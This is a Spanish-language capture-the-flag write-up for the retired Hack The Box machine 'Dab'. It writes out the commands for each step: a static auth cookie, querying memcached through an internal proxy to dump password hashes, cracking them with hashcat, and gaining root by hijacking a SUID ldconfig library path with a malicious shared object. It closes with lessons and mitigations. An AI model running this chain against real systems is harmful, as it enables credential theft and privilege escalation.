---
machine: Dab
os: Linux
difficulty: Hard
platform: Hack The Box
state: Retired
tags: [linux, memcached, flask, ldconfig, suid]
---

# Dab — Hack The Box (Linux)

[🇬🇧 English](README.en.md) | **Español**

> **Estado:** Retired. Ficha de referencia; sin flags ni credenciales reales.

## TL;DR

La app de desarrollo en 8080 tiene una cookie predecible y un proxy `/socket` hacia localhost. Eso permite hablar con memcached en 11211 y volcar usuarios y hashes MD5 desde la app de producción. Doce contraseñas se crackean y una da SSH. `ldconfig` SUID permite redirigir la carga de una librería de `myexec` y ejecutar código como root.

## Reconocimiento

```bash
nmap -Pn -p- --min-rate 10000 <IP>
nmap -Pn -sCV -p<PORTS> <IP>
```

```text
21/tcp    ftp
22/tcp    ssh
80/tcp    http    nginx / Flask
8080/tcp  http    nginx / Flask dev
11211/tcp memcached (localhost, proxied)
```

## Enumeración

- El FTP abierto contiene una imagen con datos ocultos; es una distracción.
- La cookie `password=secret` da acceso a la app de desarrollo.
- `/socket?port=<p>&cmd=<texto>` ejecuta `echo <texto> | nc 127.0.0.1 <p>`.
- Un escaneo de puertos a través del proxy encuentra 11211 y confirma memcached.

## Foothold

La app de producción usa memcached como almacén de sesiones y su login es vulnerable a fuerza bruta. Al autenticarse, la sesión se guarda en memcached. A través del proxy se enumeran las claves y se extraen usuarios y hashes MD5.

```bash
curl -H 'Cookie: password=secret' 'http://<IP>:8080/socket?port=11211&cmd=stats'
curl -H 'Cookie: password=secret' 'http://<IP>:8080/socket?port=11211&cmd=get%20<KEY>'
hashcat -m 0 hashes.txt /usr/share/wordlists/rockyou.txt
ssh genevieve@<IP>
```

## Movimiento lateral

No hay movimiento lateral adicional: la cadena se resuelve en el mismo host. La contraseña crackeada de `genevieve` se reutiliza directamente para SSH.

La enumeración local muestra dos binarios SUID: `ldconfig` y `myexec`. `myexec` pide una contraseña y carga `libseclogin.so`; `ldconfig` permite cambiar la ruta de búsqueda de librerías.

## Escalada de privilegios

Se compila una `libseclogin.so` propia con una función `seclogin()` que llama a `setuid(0)`, `setgid(0)` y `execl("/bin/sh")`. Se coloca en `/dev/shm`, se crea un fichero de configuración de `ldconfig` que apunta a ese directorio y se ejecuta `ldconfig -f`.

Al lanzar `myexec`, el cargador resuelve la librería maliciosa y se obtiene una shell de root.

```bash
gcc -shared -fPIC -o /dev/shm/libseclogin.so lib.c
echo /dev/shm > /dev/shm/df.conf
ldconfig -f /dev/shm/df.conf
myexec
```

## Evidencia

- Salidas recortadas de los comandos clave; sin flags, credenciales ni tokens.
- Los valores reales, si existen, viven en `private/` y no se publican.

## Lecciones aprendidas

- Una cookie de autenticación débil no es autenticación.
- Un proxy de diagnóstico puede exponer servicios ligados a localhost.
- Las sesiones en memcached pueden filtrar credenciales si se enumeran las claves.
- `ldconfig` SUID permite controlar la resolución de librerías.

## Mitigaciones y detección

- Eliminar la cookie estática y usar sesiones firmadas en servidor.
- Restringir `/socket` a destinos y puertos concretos, o eliminarlo.
- No ejecutar memcached con datos sensibles y aislarlo por red.
- Quitar SUID a `ldconfig` y revisar binarios con RPATH.

## Referencias

- [0xdf — Dab](https://0xdf.gitlab.io/2019/02/02/htb-dab.html)
- [Búsqueda de vídeos (CSV)](https://www.youtube.com/results?search_query=ippsec+dab)
- [Búsqueda de writeups (CSV)](https://medium.com/search?q=hackthebox+dab+writeup)
